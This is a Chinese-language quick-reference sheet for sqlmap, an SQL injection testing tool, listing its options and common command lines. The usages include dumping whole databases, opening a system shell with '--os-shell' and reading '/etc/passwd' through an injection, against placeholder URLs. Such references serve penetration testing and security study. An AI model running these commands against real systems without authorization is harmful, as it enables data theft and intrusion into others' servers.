sqlmap - SQL注入自动化检测工具
═══ 全部参数 ═══
-u, --url=<URL>            目标URL（带参数）
-r, --request=<file>       从文件加载HTTP请求
--data=<data>              POST数据
--cookie=<cookie>          Cookie头
--dbs                     枚举数据库
--tables                  枚举表
--columns                 枚举列
--dump                    导出数据
--dump-all                导出所有数据库
--current-db              当前数据库
--current-user            当前用户
--batch                   自动模式（不交互）
--risk=<1-3>              风险等级（默认1）
--level=<1-5>             检测等级（默认1）
--threads=<n>             并发线程数
--proxy=<proxy>           使用代理
--tor                     使用Tor网络
--fresh-queries           忽略缓存查询

═══ 常用用法 ═══
sqlmap -u "http://target/page?id=1"         检测URL注入
sqlmap -u "url?id=1" --dbs                  枚举数据库
sqlmap -u "url?id=1" --tables               枚举表
sqlmap -u "url?id=1" -D mydb --dump         导出指定表
sqlmap -r request.txt                       从请求文件检测
sqlmap -r req.txt --batch --dbs             批量模式枚举
sqlmap -u "url?id=1" --risk=3 --level=5     最大检测强度
sqlmap -u "url?id=1" --os-shell             获取系统shell
sqlmap -u "url?id=1" --file-read=/etc/passwd 读取文件
sqlmap -u "url?id=1" --threads=10           10线程加速
